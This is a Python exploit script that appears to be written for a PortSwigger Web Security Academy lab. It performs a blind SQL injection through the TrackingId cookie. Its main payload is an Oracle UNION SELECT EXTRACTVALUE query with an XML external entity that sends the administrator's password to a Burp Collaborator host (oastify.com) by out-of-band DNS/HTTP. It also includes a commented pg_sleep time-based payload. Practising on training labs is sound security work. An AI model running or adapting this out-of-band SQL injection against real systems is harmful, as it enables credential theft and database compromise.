import requests
import string
from urllib.parse import quote_plus, quote

charset = string.ascii_lowercase + string.digits
# charset = "tdepmpqvc9hdrbscined"

burp0_url = "https://0a20004004f896b380130352005100b6.web-security-academy.net/filter?category=Pets"
burp0_cookies = {
    "TrackingId": "AlkrYDDTZC31Wwdc",
    "session": "3r38N0CTjalkQOJwXs8wPJf6Q4bxhVhX",
}


# Sample payload: '; SELECT 1 FROM pg_sleep(10)--
def blind_sql(payload):
    global burp0_url
    global burp0_cookies
    modified_cookies = burp0_cookies.copy()
    modified_cookies["TrackingId"] += payload
    res = requests.get(burp0_url, cookies=modified_cookies)
    print(res.status_code)


def parse_payload(query, burp_collaborator_url):
    x = f"""UNION SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||({query})||'.{burp_collaborator_url}/"> %remote;]>'),'/l') FROM dual"""
    payload = f"'{quote_plus(x)}--"
    return payload

payload = parse_payload("SELECT password from users where username='administrator'", "o1qccbamtvzvyoh0ol4ql72zcqih67uw.oastify.com")
blind_sql(payload=payload)
